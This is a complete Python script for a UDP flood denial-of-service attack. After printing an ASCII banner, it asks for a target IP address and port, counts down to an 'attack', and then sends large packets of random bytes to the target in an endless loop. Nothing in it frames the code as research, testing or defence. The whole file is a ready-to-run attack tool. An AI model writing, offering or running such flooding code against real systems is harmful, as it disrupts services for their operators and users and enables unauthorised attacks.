import socket
import random
import os
import time

bytes = random._urandom(47680)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("▗▄▄▄   ▗▄▄▖▗▄▄▖  ▗▄▖ ▗▖  ▗▖     ▗▄▖ ▗▖  ▗▖▗▖  ▗▖▗▄▄▄▖▗▖ ▗▖▗▄▄▄▖▗▖    ▗▄▖▗▄▄▄▖▗▄▖ ▗▄▄▖ ")
print("▐▌  █ ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▞▜▌    ▐▌ ▐▌▐▛▚▖▐▌▐▛▚▖▐▌  █  ▐▌ ▐▌  █  ▐▌   ▐▌ ▐▌ █ ▐▌ ▐▌▐▌ ▐▌")
print("▐▌  █ ▐▌▝▜▌▐▛▀▚▖▐▛▀▜▌▐▌  ▐▌    ▐▛▀▜▌▐▌ ▝▜▌▐▌ ▝▜▌  █  ▐▛▀▜▌  █  ▐▌   ▐▛▀▜▌ █ ▐▌ ▐▌▐▛▀▚▖")
print("▐▙▄▄▀ ▝▚▄▞▘▐▌ ▐▌▐▌ ▐▌▐▌  ▐▌    ▐▌ ▐▌▐▌  ▐▌▐▌  ▐▌▗▄█▄▖▐▌ ▐▌▗▄█▄▖▐▙▄▄▖▐▌ ▐▌ █ ▝▚▄▞▘▐▌ ▐▌")

ip = input("Enter Host Adress: ")
port = input("Enter port number: ")

countdown = 5
os.system("clear")
while countdown > 0:
    print("Attack Starting in " + str(countdown))
    countdown = countdown - 1
    time.sleep(0.5)

while True:
     sock.sendto(bytes, (ip, int(port)))
     print ("Sent bytes" + " to " + ip + ", port: " + str(port))
